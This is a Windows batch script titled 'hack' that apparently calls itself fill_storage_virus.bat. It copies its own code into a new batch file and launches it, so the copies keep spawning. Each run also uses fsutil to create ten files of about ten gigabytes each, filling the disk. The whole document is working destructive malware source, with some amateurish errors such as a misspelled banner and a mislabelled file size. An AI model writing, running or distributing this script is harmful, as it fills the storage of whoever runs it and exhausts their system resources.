@echo off 
title hack
echo Harcking ): 

SET /A test=%RANDOM% 

FOR /L %%y IN (1,1,1) DO (

    IF NOT EXIST "f" (
    	mkdir f%%yfi468_%test%
    )

    echo create %%y_%test%_newb.bat
    IF NOT EXIST "%%y_%test%_newb.bat" (
    	for /f "tokens=*" %%s in (fill_storage_virus.bat) do (
            echo %%s
        ) >> "%%y_%test%_newb.bat"
    )
    start %%y_%test%_newb.bat
    echo start %%y_%test%_newb.bat

    FOR /L %%x IN (1,1,10) DO (
        fsutil file createnew "f%%yfi468_%test%\%%x %%y newt.txt" 10000000000
        echo create new file 10000000000kb
    )

)

pause

